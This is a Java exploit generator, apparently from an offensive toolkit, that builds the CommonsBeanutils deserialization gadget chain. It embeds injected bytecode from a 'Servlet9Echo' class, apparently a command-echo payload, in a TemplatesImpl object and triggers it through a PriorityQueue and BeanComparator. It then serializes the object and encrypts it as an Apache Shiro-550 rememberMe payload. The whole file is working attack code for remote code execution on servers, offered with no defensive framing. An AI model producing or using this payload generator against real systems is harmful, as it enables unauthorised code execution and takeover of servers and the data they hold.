import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ObjectInputStream;
import java.util.PriorityQueue;

public class CommonsBeanutils {
    public static void main(String[] args) throws Exception{
//        byte[][] bytes = Util.getExpClassFileBytes("EvilClass");
        byte[] bytes2 = new Servlet9Echo().getCode();

        TemplatesImpl templates = new TemplatesImpl();
        Util.setValue(templates, "_name", "v");
        Util.setValue(templates, "_bytecodes",new byte[][]{bytes2});
        Util.setValue(templates, "_tfactory", new TransformerFactoryImpl());

        PriorityQueue queue = new PriorityQueue(1);

        BeanComparator beanComparator = new BeanComparator();

        queue.add(1);
        queue.add(1);

        Object[] queue1 = (Object[]) Util.getObjectFieldValue(queue, "queue");
        queue1[0] = templates;

        Util.setValue(queue, "comparator", beanComparator);

        Util.setValue(beanComparator, "property", "outputProperties");

        byte[] serial = Util.toSerial(queue);

        Util.writeSerialToFile(queue);

        Util.shiro550Encrypt(serial);

//        ObjectInputStream in = Util.fromSerial(serial);
//
//        in.readObject();
    }
}
